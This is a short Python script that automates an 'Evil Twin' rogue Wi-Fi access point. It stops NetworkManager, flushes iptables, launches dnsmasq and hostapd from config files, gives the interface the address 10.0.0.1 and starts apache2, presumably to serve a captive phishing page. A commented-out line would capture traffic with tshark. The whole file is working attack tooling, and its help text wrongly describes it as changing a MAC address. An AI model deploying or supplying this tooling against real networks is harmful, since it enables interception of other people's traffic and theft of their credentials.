import subprocess
import optparse

def parseri():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to change its MAC")
    (options, args) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options

def Evil_Twin(interface):
    subprocess.call(["sudo", "service", "NetworkManager", "stop"])
    subprocess.call(["sudo", "./8.1 flushiptables.sh.sh"])
    subprocess.call(["sudo", "dnsmasq", "-C", "9.1 dnsmasq.conf.conf"])
    subprocess.call(["sudo", "hostapd", "9.2 hostapd.conf.conf", "-B"])
    subprocess.call(["sudo", "ifconfig", interface, "10.0.0.1", "netmask", "255.255.255.0"])
    subprocess.call(["sudo", "service", "apache2", "start"])
#    subprocess.call(["sudo","tshark", "-i",interface, "-w", "wifi.cap"])


def main():
    options = parseri()
    Evil_Twin(options.interface)

if __name__ == "__main__":
    main()
